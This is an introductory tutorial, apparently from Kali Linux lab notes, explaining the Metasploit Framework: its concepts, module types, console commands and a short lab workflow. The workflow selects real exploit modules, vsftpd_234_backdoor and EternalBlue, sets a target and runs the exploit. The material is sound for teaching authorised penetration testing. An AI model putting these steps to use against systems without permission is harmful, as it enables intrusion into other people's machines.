  # Metasploit — Introduction to Exploitation Framework  
*(Kali Linux Cybersecurity Labs)*

---

## Introduction

**Metasploit Framework** is one of the most powerful tools in penetration testing.

It is mainly used for:

- Exploiting vulnerabilities  
- Testing system security  
- Developing and executing payloads  
- Simulating real cyberattacks in legal environments  

Metasploit is widely used by:

- Ethical hackers  
- Security researchers  
- Penetration testers  

---

## ⚠️ Disclaimer

This documentation is strictly for:

- Educational purposes  
- Authorized penetration testing  
- Legal lab environments only (TryHackMe, HackTheBox)

 # Do NOT use Metasploit against systems you do not own or have permission to test.

---

## Key Concepts

| Term        | Meaning                                                  |
|-------------|----------------------------------------------------------|
| Exploit     | Code that takes advantage of a vulnerability             |
| Payload     | Code executed after successful exploitation              |
| Module      | A component inside Metasploit (exploit, auxiliary, etc.) |
| Session     | Active connection to a compromised target                |
| Meterpreter | Advanced payload providing remote control                |

---

# Metasploit Architecture

Metasploit is organized into modules:

| Module Type       | Purpose                                      |
|-------------------|----------------------------------------------|
| Exploit           | Attacks a vulnerability                      |
| Payload           | Executes code on the target                  |
| Auxiliary         | Scanning, fuzzing, brute-force (non-exploit) |
| Post-Exploitation | Actions after gaining access                 |
| Encoder           | Helps bypass signature detection             |

---

# Starting Metasploit

### Launch the Framework Console

 msfconsole

## Basic Commands
| Command         | Description                |
| -----------------| ------------------------- |
| help             | Show available commands   |
| search           | Find exploits or modules  |
| use              | Select a module           |
| show options     | Display required settings |
| set              | Configure an option       |
| run or exploit   | Execute the module        |
| sessions         | View active sessions      |
| exit             | Quit Metasploit           |

## Searching for an Exploit :

  search vsftpd

 # Metasploit will list modules related to that service.

 ## Using a Module :
  Example:
   use exploit/unix/ftp/vsftpd_234_backdoor
  Then view required options:
   show options   

  ## Setting Target Information :
   Example:
   set RHOSTS 192.168.1.20
     RHOSTS = target IP address
     LHOST = attacker IP (your machine)

  ## Running the Exploit :
  exploit
  If successful, you may open a session.

   ## Meterpreter Sessions :
  Meterpreter is the most common payload in Metasploit.

 ## Useful commands:
| Command | Description                 |
| --------| --------------------------- |
| sysinfo | Target system information   |
| pwd     | Current directory           |
| ls      | List files                  |
| getuid  | Current user                |
| exit    | Close session               |

  ## Simple Lab Example (Legal)
 # 1.Start Metasploit:
  msfconsole

 # 2.Search an exploit:
  search
   Exemple:
  search smb

  # 3.Use a module
   Exemple:
   use exploit/windows/smb/ms17_010_eternalblue

  # 4.Configure target:
   set RHOSTS 192.168.x.x

  # 5.Run:
   exploit 

  ### Summary — What to Remember
   Metasploit is an exploitation and testing framework
   Uses modules: exploit, payload, auxiliary
   msfconsole is the main interface
   Always configure RHOSTS before running
   Meterpreter provides advanced control
   Use only in legal lab environments


  ### Skills Gained
   Understanding exploitation frameworks
   Navigating Metasploit modules
   Learning ethical penetration testing workflows
   Practicing vulnerability research in labs

   ## Metasploit is a core tool for professional penetration testers and cybersecurity analysts.

   
  
 
